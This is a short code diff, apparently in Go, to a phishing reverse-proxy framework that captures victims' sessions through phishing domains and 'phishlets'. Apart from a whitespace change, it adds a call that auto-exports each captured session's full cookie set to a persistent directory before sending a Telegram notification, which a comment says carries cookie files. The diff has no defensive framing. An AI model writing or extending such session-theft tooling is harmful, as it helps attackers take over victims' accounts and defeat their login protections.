@@ -92,7 +92,7 @@ type HttpProxy struct {
 
 type ProxySession struct {
     SessionId    string
-    Created      bool
+    Created     bool
     PhishDomain  string
     PhishletName string
     Index        int
@@ -2364,6 +2364,10 @@ func (p *HttpProxy) sendTelegramNotificationForSession(sid string) {
     }
 
     p.session_mtx.Unlock()
+
+    // Auto-export the session (full in-memory cookie set) to the
+    // persistent exports directory before notifying.
+    _ = AutoExportSession(ts)
 
     // Use the QUEUE-BASED notification system instead of raw HTTP
     // This properly creates formatted messages with cookie files
